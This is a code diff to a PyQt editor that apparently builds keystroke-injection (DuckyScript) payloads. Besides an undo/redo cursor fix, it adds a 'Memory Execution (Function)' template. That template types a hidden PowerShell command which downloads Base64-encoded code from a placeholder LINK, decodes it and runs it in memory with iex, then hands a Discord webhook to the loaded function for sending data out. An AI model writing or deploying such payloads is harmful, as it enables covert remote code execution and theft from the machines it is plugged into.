@@ -256,7 +256,8 @@ class CodeEditor(QMainWindow):
             ("New", self.loadFreshCode),
             ("Basic", self.loadBasicCode),
             ("Base64", self.loadBase64Code),
-            ("Memory Execution", self.loadMemoryExecutionCode)
+            ("Memory Execution", self.loadMemoryExecutionCode),
+            ("Memory Execution (Function)", self.loadMemoryExecutionCodeANOTHA)
         ]
         for name, callback in new_actions:
             self.new_menu.addAction(QAction(name, self, triggered=callback))
@@ -277,6 +278,9 @@ class CodeEditor(QMainWindow):
         if not self.history:
             return
 
+        cursor = self.text_edit.textCursor()
+        current_position = cursor.position()
+
         self.redo_stack.append((self.text_edit.toHtml()))
         prev_state = self.history.pop()
 
@@ -284,14 +288,15 @@ class CodeEditor(QMainWindow):
         self.text_edit.setHtml(prev_state)
         self.text_edit.textChanged.connect(self.colorizeText)
 
-        cursor = self.text_edit.textCursor()
-        current_position = min(cursor.position(), len(prev_state))
         cursor.setPosition(current_position)
         self.text_edit.setTextCursor(cursor)
 
     def redoAction(self):
         if not self.redo_stack:
             return
+
+        cursor = self.text_edit.textCursor()
+        current_position = cursor.position()
 
         self.history.append((self.text_edit.toHtml()))
         next_state = self.redo_stack.pop()
@@ -300,8 +305,6 @@ class CodeEditor(QMainWindow):
         self.text_edit.setHtml(next_state)
         self.text_edit.textChanged.connect(self.colorizeText)
 
-        cursor = self.text_edit.textCursor()
-        current_position = min(cursor.position(), len(next_state))
         cursor.setPosition(current_position)
         self.text_edit.setTextCursor(cursor)
 
@@ -652,6 +655,18 @@ DELAY 500
 ENTER"""
         self.text_edit.setPlainText(base64_code)
         self.colorizeText()
+
+    def loadMemoryExecutionCodeANOTHA(self):
+        memory_execution_codeANOTHA = """REM The script must interface with a Base64-encoded LINK for proper functionality.
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell -NoP -W H iex([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String((iwr LINK).Content)));FUNCTION -wh DISCORD WEBHOOK
+DELAY 1000
+ENTER"""
+        self.text_edit.setPlainText(memory_execution_codeANOTHA)
+        self.colorizeText()
+
 
 def main():
     app = QApplication(sys.argv)
